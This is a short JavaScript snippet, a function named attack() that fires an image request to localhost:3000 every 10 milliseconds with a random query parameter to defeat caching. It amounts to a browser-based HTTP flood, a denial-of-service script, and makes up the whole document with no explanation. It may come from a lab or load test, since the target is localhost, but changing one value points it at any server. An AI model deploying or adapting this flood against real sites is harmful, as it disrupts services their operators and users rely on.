function attack() {
    var TARGET = 'localhost:3000'
    var URI = '/'
    var pic = new Image()
    var rand = Math.floor(Math.random() * 1000)
    pic.src = 'http://'+TARGET+URI+'?'+rand+'=val'
  }
  setInterval(attack, 10)